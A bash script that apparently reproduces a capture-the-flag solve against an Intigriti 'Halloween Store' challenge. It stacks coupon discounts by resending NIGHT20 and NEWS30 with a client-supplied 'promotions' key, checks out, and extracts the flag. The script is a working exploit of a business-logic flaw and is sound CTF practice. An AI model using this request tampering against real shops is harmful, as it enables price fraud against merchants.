#!/bin/bash
# Clean-room repro of the Intigriti 1026 ("Halloween Store") solve: fresh session, exact
# executed sequence. Rebuilds the full chain vault order + twice-applied NIGHT20/NEWS30 via
# a client-supplied `promotions` key. Challenge instance offline after close; kept as the
# verbatim probe chain. Shared-infra rule intact: --http1.1 + Connection: close, ~1 rps.
# Rule: retry on HTML/pool-noise responses; ~1 rps.
H="https://challenge-1026.challenges.intigriti.io"
OUT="repro-clean-1026-output.txt"
JAR="repro-clean-1026-cookies.txt"
: > "$OUT"

log() { echo "" >> "$OUT"; echo "===== $1 =====" >> "$OUT"; }
req() { # name path json_body
  local name="$1" path="$2" body="$3" n=0 out=""
  log "$name"
  while [ $n -lt 4 ]; do
    if [ -n "$body" ]; then
      out=$(curl -s -c "$JAR" -b "$JAR" --http1.1 -H 'Content-Type: application/json' -H 'Connection: close' -d "$body" -m 20 "$H$path")
    else
      out=$(curl -s -c "$JAR" -b "$JAR" --http1.1 -H 'Connection: close' -m 20 "$H$path")
    fi
    if echo "$out" | grep -qE '<!DOCTYPE|Error response|upstream connect'; then
      n=$((n+1)); sleep 2; continue
    fi
    break
  done
  echo ">> $out" >> "$OUT"
  echo "$out"
}

init_session() { # GET /api/session until a cookie binds
  local n=0
  while [ $n -lt 4 ]; do
    curl -s -c "$JAR" -b "$JAR" -m 20 "$H/api/session" >/dev/null
    if grep -q session "$JAR" 2>/dev/null; then return 0; fi
    n=$((n+1)); sleep 2
  done
  return 1
}

log "T0 $(date -u +%FT%TZ) clean-repro start (fresh jar)"
grep -q session "$JAR" 2>/dev/null || { init_session; log "session-init"; }

S_INIT=$(req "GET /api/session" /api/session "")
S_ADD=$(req "POST /api/cart/items vault" /api/cart/items '{"productId":"midnight-vault"}')
S_NIGHT=$(req "POST /api/cart/coupon NIGHT20" /api/cart/coupon '{"code":"NIGHT20"}')
S_SUB=$(req "POST /api/newsletter" /api/newsletter '{"email":"researcher@example.com"}')
S_NEWS=$(req "POST /api/cart/coupon NEWS30" /api/cart/coupon '{"code":"NEWS30"}')
S_BYN=$(req "POST /api/cart/coupon NIGHT20+promotions[]" /api/cart/coupon '{"code":"NIGHT20","promotions":[]}')
S_BYW=$(req "POST /api/cart/coupon NEWS30+promotions[]" /api/cart/coupon '{"code":"NEWS30","promotions":[]}')
S_CART=$(req "GET /api/cart (pre-checkout)" /api/cart "")
S_OUT=$(req "POST /api/checkout" /api/checkout '{}')

log "SUMMARY-extraction"
python3 - "$OUT" <<'EOF'
import json, re, sys
txt = open(sys.argv[1]).read()
flag = re.findall(r'INTIGRITI\{[0-9a-f-]+\}', txt)
print("FLAG(S) FOUND:", flag)
# final cart state
m = re.search(r'===== GET /api/cart \(pre-checkout\) =====.*?>> (.*)', txt)
if m:
    c = json.loads(m.group(1)).get('cart', {})
    print("pre-checkout: disc=%s total=%s canCheckout=%s promos=%s" % (
        c.get('discount'), c.get('total'), c.get('canCheckout'),
        [(p['code'], p['count']) for p in c.get('promotions', [])]))
EOF
echo "log file: $OUT"